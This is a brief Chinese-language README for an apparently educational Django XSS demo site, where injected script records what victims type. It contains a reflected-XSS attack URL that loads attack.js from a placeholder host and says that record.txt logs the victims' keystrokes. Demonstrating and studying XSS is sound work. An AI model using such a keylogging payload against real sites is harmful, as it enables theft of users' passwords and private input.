# Django XSS Sample

Django XSS漏洞站点示例，攻击者可以获取用户的键盘输入



部署好之后通过以下攻击URL进行访问，攻击和受害方可以分开部署
http://网址/?name=mia%3Cscript%20src=%22http://网址/static/attack.js%22%3E%3C/script%3E



record.txt

用以记录受害者的输入